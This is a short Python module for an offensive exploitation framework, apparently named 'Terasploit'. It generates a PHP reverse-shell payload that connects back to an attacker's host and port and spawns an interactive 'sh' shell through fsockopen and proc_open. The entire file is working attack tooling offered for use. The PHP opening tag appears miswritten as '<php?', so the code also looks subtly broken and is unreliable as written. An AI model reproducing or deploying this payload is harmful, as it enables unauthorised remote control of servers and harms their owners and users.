# -*- coding: utf-8 -*-

"""
Payload: Generic Shell Reverse TCP
Documentation: N/A
----
"""

from framework.modules.payload import Payload
from framework.sessions import pulsar_generic
from framework.modules.metadata import (
    Module,
    Arch,
    Platform,
    PayloadHandler
)


class TerasploitModule(Payload):

    def __init__(self):
        super().__setattr__(
            "info", {
                "License": "BSD-3-Clause License",
                "Name": "PHP Shell Reverse TCP",
                "Module": Module.PAYLOAD,
                "Arch": Arch.PHP,
                "Platform": Platform.PHP,
                "PayloadHandler": PayloadHandler.REVERSE_TCP,
                "Session": pulsar_generic.session,
                "Provider": [
                    "charlie <rupture6.dev[a]gmail.com>",
                ],
                "Description": [
                    "Connect back on the attacker "
                    "machine and spawn an interactive shell."
                ],
                "DefaultOptions": ["LHOST", "LPORT"]
            }
        )

    def generate(self):

        # Gather the local address and port
        lhost = self.opt("LHOST")
        lport = self.opt("LPORT")

        # Shell contents
        shell: str = (
            "<php?"
            f"$sock=fsockopen(\"{lhost}\",{lport});"
            "$proc=proc_open(\"sh\", "
            "array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);"
            "?>"
        )

        # Return the shell
        return shell
